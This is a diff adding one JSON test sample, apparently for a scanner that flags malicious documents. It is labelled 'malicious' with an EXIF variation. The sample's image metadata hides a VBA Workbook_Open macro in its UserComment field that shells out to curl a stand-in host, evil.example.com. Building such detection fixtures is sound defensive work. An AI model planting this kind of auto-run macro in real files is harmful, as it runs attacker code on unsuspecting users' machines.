@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::38::binary-variations::2",
+  "base_sample_id": "exp::document-office::38",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -78787939,
+  "content": "{\n  \"format\": \"image\",\n  \"metadata\": {\n    \"UserComment\": \"Private Sub Workbook_Open()\\n  CreateObject(\\\"WScript.Shell\\\").Run \\\"curl http://evil.example.com/\\\"\\nEnd Sub\\n\",\n    \"Make\": \"Canon\",\n    \"Model\": \"EOS R5\",\n    \"DateTime\": \"2026:01:15 10:30:00\",\n    \"ExifVersion\": \"0232\"\n  }\n}",
+  "content_hash": "2832c2657b5de149d8a8d26bebdf6309921f0c511821789b3d02da354e3ea40d",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:exif",
+  "difficulty": "advanced"
+}
